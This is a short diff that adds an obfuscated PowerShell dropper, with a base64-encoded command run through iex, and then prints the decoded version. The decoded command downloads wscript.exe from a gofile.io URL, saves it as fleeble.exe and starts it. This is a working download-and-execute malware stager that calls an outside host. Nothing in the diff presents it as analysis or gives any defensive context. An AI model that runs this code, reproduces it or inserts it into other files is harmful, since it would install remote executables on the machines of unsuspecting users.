@@ -1,0 +1,7 @@
+iex([sySTEM.TeXT.EnCodiNg]::uTF8.gEtstRiNg([sYStEm.cONveRT]::FrOmBaSE64sTRInG('CihOZXctT2JqZWN0IFNZU3RlbS5ORXQud2VCQ0xpZU5UKS5kb3duTE9BRGZJbGUoJ2h0dHBzOi8vc3J2LWZpbGUxLmdvZmlsZS5pby9kb3dubG9hZC9TSkxLYUcvODQuMjAwLjY1LjIwL3dzY3JpcHQuZXhlJywnZmxlZWJsZS5leGUnKTtTdGFydC1Qcm9jZXNzICdmbGVlYmxlLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYStem.NEt.weBCLieNT).downLOADfIle('https://srv-file1.gofile.io/download/SJLKaG/84.200.65.20/wscript.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
